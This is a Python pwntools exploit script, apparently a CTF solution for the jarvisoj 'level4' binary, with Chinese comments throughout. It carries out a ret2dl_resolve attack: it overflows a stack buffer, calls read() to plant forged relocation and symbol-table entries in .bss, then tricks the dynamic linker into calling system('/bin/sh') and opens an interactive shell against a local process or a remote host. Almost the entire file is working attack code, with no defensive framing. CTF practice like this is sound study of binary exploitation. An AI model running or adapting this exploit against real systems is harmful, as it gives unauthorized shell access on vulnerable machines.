#encoding:utf-8
from pwn import *
debug = 1
fpath  = "./level4"
padding_offset  = 0x8c


if debug:
	p = process(fpath)
else:
	p = remote('pwn2.jarvisoj.com' , 9880)

def show(name , content):
	 print "%s : 0x%x" % (name , content)

def get(name , libc , type = "func"):
	offset = 0
	if type == "func": 
		offset = libc.symbols[name]
	elif type == "str":
		offset = libc.search(name).next()
	elif type == "got":
		offset = libc.got[name]
	elif type == "plt":
		offset = libc.plt[name]
	show(type + "@" +  name , offset)
	return offset

def align(target , orign , size):
	padding_len = size - (target - orign) % size
	return (target + padding_len , padding_len)

def fill(length , buf = ""):
	temp_len =  length - len(buf) 
	return buf + temp_len * 'a'

sou = ELF(fpath)
padding = padding_offset * 'a'

if __name__ == '__main__':
	bss_table 	= get("__bss_start" , sou) 
	PLT  	    = 0x08048300           	   # .plt       
	JMPREL   	= 0x080482b0			   # JMPREL => .rel.plt  |  readelf -d 查看 .dynamic 动态信息表
	read_plt   	= get("read" , sou , "plt")
	read_got  	= get("read" , sou , "got")
	addr_pppr	= 0x08048509               #  target :  POP args 清除上一个函数的传参
	fake_size  	= 8						   #  >= len("/bin/sh\x00")
	RELENT     	= 8						   #  RELENT <=  JMPREL | PLTRELSZ /  RELENT = (JMPREL 的条数)     

	addr_reloc , padding_len_rel = align(bss_table + fake_size , JMPREL , RELENT) # 伪装的.rel.plt 的条目地址
	reloc_offset= addr_reloc - JMPREL  											  # .rel.plt条目 对 JMPREL(.rel.plt) 的偏移 	

	payload1  	=  padding 
	payload1 	+= p32(read_plt) + p32(addr_pppr) + p32(0)  + p32(bss_table) +p32(100) # read(0 , bss_table , 100) and pppr gadget  
	payload1 	+= p32(PLT) + p32(reloc_offset)										   # dl_runtime_resolve(linkmap , reloc_offset ) => push addr_target_func(now | push addr_system)	
	# PLT 这个地址 对应的指令是 push linkmap , jmp addr_dl_runtime_resolve 所以与其他调用函数的结构不同
	# dl_runtime_resolve 的指令中 会将绑定的函数地址压入栈，所以下面可以直接输入传参和返回值			
	payload1    += p32(fake_size) +p32(bss_table)                                      # system([bss_table])  #now | system("/bin/sh")			
	p.send(payload1)·

	STRTAB 		= 0x0804822c			   # .dynstr表的偏移
	SYMTAB 		= 0x080481cc			   # .dynsym
	SYMENT    	= 16					   # sizeof(.dynsym) 一个条目的byte长度  ( readelf -d level4 | grep  SYMENT # -S level4 | grep .dynsym    size属性)

	addr_reloc_sym  , padding_len_sym = align(addr_reloc + RELENT , SYMTAB , SYMENT) # 伪装的sym条目地址
	addr_reloc_str  = addr_reloc_sym + SYMENT									     # 伪装的函数名地址

	str_offset 	= addr_reloc_str - STRTAB											 # .dynsym 条目中 st_name 对于 .dynstr表的偏移
	sym_index  	= (addr_reloc_sym - SYMTAB) / SYMENT								 # 伪造的.dynsym条目对于.dynsym的 index (offset = index * sizeof(.dynsym)		
	r_info     	= (sym_index << 8 )| 0x7						 					 # plt条目中的r_info (<ii | r_offset , r_info)               
	
	payload2 	=  fill(fake_size ,  "/bin/sh\x00")                                  # system 参数并且补齐至fakesize长度(#todo : fill 函数没有做越界检查)
	payload2 	+= fill(padding_len_rel) 											 # 对齐 JMPREL(.rel.plt)表
	payload2    += p32(bss_table + fake_size) + p32(r_info)  					     # 伪装的plt条目内容 (<ii 	| r_offset , r_info)    
	payload2 	+= fill(padding_len_sym)											 # 对齐 .dynsym表
	payload2    += p32(str_offset) + p32(0) + p32(0) + p32(0x12)					 # 伪装的sym条目内容 (<iiii | st_name_offset , st_value , st_size , st_info)(st_info 1<<4|2   前28位 符号绑定信息 1 指的是全局符号 , 后四位 符号类型 2 函数或其他可执行代码 )         
	payload2 	+= "system\x00"													     # 伪装的st_name值
	payload2 	=  fill(100 , payload2)
	p.send(payload2)
	p.interactive()